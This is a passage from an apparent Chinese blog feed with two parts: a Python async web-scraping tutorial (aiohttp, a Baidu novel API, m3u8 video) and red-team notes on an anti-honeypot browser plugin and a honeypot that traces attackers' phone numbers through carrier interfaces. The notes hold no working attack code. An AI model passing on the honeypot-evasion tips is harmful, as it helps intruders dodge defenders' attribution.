data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074223.jpg"                      alt="image-20220919165911861"                ></p><p>​    这只是一种直观的观察方式，平时我们不这么写代码，我们再修改下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">4</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 写法一 , 不推荐</span></span><br><span class="line">    <span class="comment"># f1 = func1()</span></span><br><span class="line">    <span class="comment"># await f1  # 一般await挂起操作放在协程对象前面</span></span><br><span class="line">    <span class="comment"># 写法二</span></span><br><span class="line">    tasks = [</span><br><span class="line">        func1(),</span><br><span class="line">        func2(),</span><br><span class="line">        func3()</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="built_in">print</span>(t2 - t1)</span><br></pre></td></tr></table></figure><p>​    下面提供一个模版，注意只是演示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;准备开始下载&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)  <span class="comment"># 模拟网络请求</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;下载完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    urls = [</span><br><span class="line">        <span class="string">&quot;http://www.baidu.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.bilibili.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.163.com&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        d = download(url)</span><br><span class="line">        tasks.append(d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><p>​    注意，3.8可能会报一个警告。在后续的写法里我们需要吧对象包装成协程对象就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，</span></span><br><span class="line"><span class="comment"># # 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作</span></span><br><span class="line"><span class="comment"># # 在宏观上，我们能看到的其实是多个任务一起在执行</span></span><br><span class="line"><span class="comment"># # 多任务异步操作</span></span><br><span class="line"><span class="comment"># import asyncio</span></span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># async def func1():</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是mes9s0&quot;)</span></span><br><span class="line"><span class="comment">#     # time.sleep(3)  # 当程序出现了同步操作的时候，异步就中断了</span></span><br><span class="line"><span class="comment">#     await asyncio.sleep(3)  # 异步操作的代码</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是mes9s0&quot;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># async def func2():</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是王建国&quot;)</span></span><br><span class="line"><span class="comment">#     # time.sleep(2)</span></span><br><span class="line"><span class="comment">#     await asyncio.sleep(2)  # 异步操作的代码</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是王建国&quot;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># async def func3():</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是李雪琴&quot;)</span></span><br><span class="line"><span class="comment">#     # time.sleep(4)</span></span><br><span class="line"><span class="comment">#     await asyncio.sleep(4)  # 异步操作的代码</span></span><br><span class="line"><span class="comment">#     print(&quot;你好啊，我是李雪琴&quot;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     f1 = func1()</span></span><br><span class="line"><span class="comment">#     f2 = func2()</span></span><br><span class="line"><span class="comment">#     f3 = func3()</span></span><br><span class="line"><span class="comment">#     tasks = [</span></span><br><span class="line"><span class="comment">#         f1, f2, f3</span></span><br><span class="line"><span class="comment">#     ]</span></span><br><span class="line"><span class="comment">#     t1 = time.time()  # 记录时间</span></span><br><span class="line"><span class="comment">#     # 一次启动多个任务(协程)</span></span><br><span class="line"><span class="comment">#     asyncio.run(asyncio.wait(tasks))</span></span><br><span class="line"><span class="comment">#     t2 = time.time()</span></span><br><span class="line"><span class="comment">#     print(t2 - t1)</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">4</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 写法一 , 不推荐</span></span><br><span class="line">    <span class="comment"># f1 = func1()</span></span><br><span class="line">    <span class="comment"># await f1  # 一般await挂起操作放在协程对象前面</span></span><br><span class="line">    <span class="comment"># 写法二</span></span><br><span class="line">    tasks = [</span><br><span class="line">        asyncio.create_task(func1()),</span><br><span class="line">        asyncio.create_task(func2()),</span><br><span class="line">        asyncio.create_task(func3())</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="built_in">print</span>(t2 - t1)</span><br></pre></td></tr></table></figure><h4 id="异步http请求aiohttp模块"><a href="#异步http请求aiohttp模块" class="headerlink" title="异步http请求aiohttp模块"></a>异步http请求aiohttp模块</h4><p>​    aiohttp是python的⼀个⾮常优秀的第三⽅异步http请求库. 我们可以 ⽤aiohttp来编写异步爬⾍(协程).</p><p>​    写一个试一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># requests.get()同步的代码 -&gt; 异步操作aiohttp</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">&quot;https://www.umei.cc/d/file/20220919/d39ee6d21a61bac1ca1837c8e64015ab.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://www.umei.cc/d/file/20220919/3ccb2fe3793d9eb05e5aac78d21fc136.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://www.umei.cc/d/file/20220919/34e157502386c3abfadf159c717cc393.jpg&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">aiodownload</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># s = aiohttp.ClientSession() &lt;==&gt; requests.session()</span></span><br><span class="line">    <span class="comment"># requests.get()   .post()</span></span><br><span class="line">    <span class="comment"># s.get()    .post()</span></span><br><span class="line">    <span class="comment"># 发送请求</span></span><br><span class="line">    <span class="comment"># 得到图片内容</span></span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="comment"># 加with的作用是不用关链接了</span></span><br><span class="line">    name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]  <span class="comment"># 从右边切，切一次，得到[1]位置的内容</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:  <span class="comment"># requests</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:  <span class="comment"># resp = requests.get()</span></span><br><span class="line">            <span class="comment"># 请求回来了，写入文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="keyword">await</span> resp.content.read())  <span class="comment"># 读取内容异步的，需要await挂起</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;搞定&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        tasks.append(aiodownload(url))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><h4 id="异步爬虫扒光西游记"><a href="#异步爬虫扒光西游记" class="headerlink" title="异步爬虫扒光西游记"></a>异步爬虫扒光西游记</h4><p>​    分析网站得到一下几个url</p><p>​    <a class="link"   href="https://dushu.baidu.com/api/pc/getCatalog?data=%7B&quot;book_id&quot;:&quot;4306063500&quot;%7D" >https://dushu.baidu.com/api/pc/getCatalog?data={&quot;book_id&quot;:&quot;4306063500&quot;}<i class="fas fa-external-link-alt"></i></a> =&gt; 所有章节的内容(名称，cid)</p><p>​    <a class="link"   href="https://dushu.baidu.com/api/pc/getChapterContent?data=%7B&quot;book_id&quot;:&quot;4306063500&quot;,&quot;cid&quot;:&quot;4306063500%7C1569782244&quot;,&quot;need_bookinfo&quot;:1%7D" >https://dushu.baidu.com/api/pc/getChapterContent?data={&quot;book_id&quot;:&quot;4306063500&quot;,&quot;cid&quot;:&quot;4306063500|1569782244&quot;,&quot;need_bookinfo&quot;:1}<i class="fas fa-external-link-alt"></i></a> =&gt; 章节的内容</p><p>​    分析一下，上面的url我们并不需要异步，而后面爬取网站的时候才需要。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://dushu.baidu.com/api/pc/getCatalog?data=&#123;&quot;book_id&quot;:&quot;4306063500&quot;&#125; =&gt; 所有章节的内容(名称，cid)</span></span><br><span class="line"><span class="comment"># 章节内部的内容</span></span><br><span class="line"><span class="comment"># https://dushu.baidu.com/api/pc/getChapterContent?data=&#123;&quot;book_id&quot;:&quot;4306063500&quot;,&quot;cid&quot;:&quot;4306063500|1569782244&quot;,&quot;need_bookinfo&quot;:1&#125;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> aiofiles</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. 同步操作：访问getCatalog 拿到所有章节的cid和名称</span></span><br><span class="line"><span class="string">2. 异步操作：访问getchapterContent 下载所有的文章内容</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">aiodownload</span>(<span class="params">cid, b_id, title</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;book_id&quot;</span>: b_id,</span><br><span class="line">        <span class="string">&quot;cid&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;b_id&#125;</span>|<span class="subst">&#123;cid&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;need_bookinfo&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line">    url = <span class="string">f&quot;https://dushu.baidu.com/api/pc/getChapterContent?data=<span class="subst">&#123;data&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span>  <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:</span><br><span class="line">            dic = <span class="keyword">await</span> resp.json()</span><br><span class="line">            <span class="comment"># 文件异步读写</span></span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(<span class="string">&quot;novel/&quot;</span> + title, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">await</span> f.write(dic[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;novel&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getCatlog</span>(<span class="params">url</span>):</span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    dic = resp.json()</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> dic[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;novel&#x27;</span>][<span class="string">&#x27;items&#x27;</span>]:</span><br><span class="line">        title = item[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        cid = item[<span class="string">&#x27;cid&#x27;</span>]</span><br><span class="line">        <span class="comment"># 准备异步任务</span></span><br><span class="line">        tasks.append(asyncio.create_task(aiodownload(cid, b_id, title)))</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    b_id = <span class="string">&quot;4306063500&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;https://dushu.baidu.com/api/pc/getCatalog?data=&#123;&quot;book_id&quot;:&quot;&#x27;</span> + b_id + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    asyncio.run(getCatlog(url))</span><br></pre></td></tr></table></figure><p>​    一瞬间就好了</p><h4 id="综合训练-视频网站工作原理"><a href="#综合训练-视频网站工作原理" class="headerlink" title="综合训练-视频网站工作原理"></a>综合训练-视频网站工作原理</h4><p>​    你现在想要做⼀个视频⽹站. 也有很多的UP猪帮你上传视频. OK, 作为服务器作者的你. 只需要把视频保存起来. 然后给出⼀个视频的链接即可. 然后在你的HTML代码中通过 video 标签引⼊即可.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;1_1_爬⾍概述.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    就可以了. 但是, 如果你这么做. 你的⽤户和⽼板⼀定会把你骂的狗⾎临头. 为什么呢? 假设你的视频是10个G的⾼清⽆码⼤资源. 那么此时, 你的⽤户和你⽼板将⾯临如下困境</p><pre><code> 1. ⽤户: 这个视频怎么加载的这么慢. 点击快进也快进不了. 太慢了.  1. ⽼板: 怎么这个⽉的流量费⼜这么⾼啊. </code></pre><p>​    视频那么⼤. 每次⽤户打开的时候. 可能只是差了最后⼏分钟没看呢. 那此时它必须把整个视 频都传输完毕. 才能看到他想看的那⾥. 等待时间肯定超⻓. ⽽每次都要把10G的⽂件进⾏⽹络传输. 流量费你懂的. </p><p>​    但凡有点⼉经验的程序员肯定会想办法把⽤户上传好的视频进⾏转码(不同清晰度)做切⽚(ts)处理. 这样既⽅便⽤户进⾏⼤跨度的调整进度条(最⼩延迟). 也能为公司节省⼤量的流量费. 既然要把视频切成⾮常多个⼩碎⽚. 那就需要有个⽂件来记录这些<strong>视频播放的顺序和⼩碎⽚的路径</strong>. </p><p>​    该⽂件⼀般为M3U⽂件. M3U⽂件中的内容经过UTF-8 的编码后, 就是M3U8⽂件. 今天, 我们看到的各⼤视频⽹站平台使⽤的⼏乎都是M3U8⽂件.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074226.jpg"                      alt="image-20220921013924750"                ></p><p>​    那么抓取一个视频的流程如下：</p><p>​    1、找到m3u8（各种手段）2、通过m3u8下载到ts文件 3、通过各种手段（不仅仅是编程手段）把ts文件合并为一个mp4文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    无前言&lt;/p&gt;
&lt;h3 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h3&gt;&lt;h4 id=&quot;robots-txt&quot;&gt;&lt;a href=&quot;#robots-txt&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="Python爬虫篇" scheme="http://example.com/categories/Python%E7%88%AC%E8%99%AB%E7%AF%87/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>没用的小技巧(RED)</title>
    <link href="http://example.com/2022/08/07/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-RED/"/>
    <id>http://example.com/2022/08/07/%E6%B2%A1%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7-RED/</id>
    <published>2022-08-07T14:40:56.000Z</published>
    <updated>2023-04-15T07:44:20.609Z</updated>
    
    <content type="html"><![CDATA[<h3 id="防蜜罐插件"><a href="#防蜜罐插件" class="headerlink" title="防蜜罐插件"></a>防蜜罐插件</h3><p>​    蜜罐：</p><p>​    1.配置jsonp接口信息</p><p>​    2.配置蜜罐网站信息</p><p>​            仿站(提供目标站点扒取页面静态文件,功能无法正常使用)</p><p>​            二次修改后的源码(功能可用正常使用,但是所有数据全部为假数据,或者是精简以后的源码)</p><p>​    3.等待踩蜜罐</p><p>​    在配置蜜罐阶段的时候，其实就会将已经配置好的jsonp接口所生成的js文件(固定|动态)URL,插入到蜜罐中的静态文件里面.以此来达到只要你打开蜜罐网站,那么js将会自动加载并且执行调用所有jsonp接口的数据,然后将数据返回至后端.</p><p>​    插件原理：判断网站域与jsonp接口请求的域是否是一个.</p><p>​    地址：<a class="link"   href="https://github.com/cnrstar/anti-honeypot" >https://github.com/cnrstar/anti-honeypot<i class="fas fa-external-link-alt"></i></a></p><hr><h3 id="一种针对热点的蜜罐"><a href="#一种针对热点的蜜罐" class="headerlink" title="一种针对热点的蜜罐"></a>一种针对热点的蜜罐</h3><p>​    <strong>这个蜜罐的溯源方式针对使用手机热点的红队人员。蜜罐直接获取攻击者手机号进行溯源。一抓一个准。各位红队人员小心为妙。</strong></p><p>​    首先打开网站，他会监控是否开启了F12控制台，如果开启了调试模式的话，溯源代码会停止加载。</p><p>​    另外，针对使用burp的用户。小心你们的burp版本是否存在chrome的漏洞。</p><p>​    沙箱的特征如下，直接加载js</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074228.jpg"                      alt="image"                ></p><p>​    fofa上面可以直接搜索到142多条</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074229.jpg"                      alt="image"                ></p><p>​    重点获取手机号js代码，可以看到会获取三大运营商的手机信息</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074230.jpg"                      alt="image"                ></p><p>​    解密如下</p><p>​    获取联通的接口</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074232.jpg"                      alt="image"                ></p><p>​    如果获取到手机号码的话，会将加密的手机号上传</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74233.jpg"                      alt="image"                ></p><p>​    另外其他溯源接口如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 